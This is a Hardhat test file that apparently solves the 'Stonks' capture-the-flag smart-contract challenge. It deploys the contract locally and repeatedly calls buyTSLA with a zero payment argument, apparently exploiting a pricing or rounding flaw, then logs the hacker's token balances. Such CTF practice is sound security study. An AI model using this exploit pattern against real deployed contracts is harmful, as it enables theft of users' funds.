const {expect} = require("chai");
const {expectRever} = require("@openzeppelin/test-helpers");


describe("CTFS Stonks hacking", function(){


    let owner, hacker, Stonks, stonks;

    before(async()=>{

        [owner, hacker] = await ethers.getSigners();

        Stonks = await ethers.getContractFactory("Stonks");
        stonks = await Stonks.deploy(hacker.address);
        await stonks.deployed();
    })


    it("Exploit", async()=>{

        let GMETokenBalance = await stonks.balanceOf(hacker.address, 1);
        console.log("Hacker GME Balance", GMETokenBalance.toString(), "GME");

        let TSLATokenBalance = await stonks.balanceOf(hacker.address, 0);
        console.log("Hacker TSLA Balance", TSLATokenBalance.toString(), "TSLA");


        for(let i = 0; i < 20; i++){

            await stonks.connect(hacker).buyTSLA(49, 0);
        }

        let TSLABalance = await stonks.balanceOf(hacker.address, 0);

        await stonks.connect(hacker).buyTSLA(TSLABalance, 0);


        let GMETokenBalanceAfter = await stonks.balanceOf(hacker.address, 1);
        console.log("Hacker GME Balance", GMETokenBalanceAfter.toString(), "GME");

        let TSLATokenBalanceAfter = await stonks.balanceOf(hacker.address, 0);
        console.log("Hacker TSLA Balance", TSLATokenBalanceAfter.toString(), "TSLA");
    })
})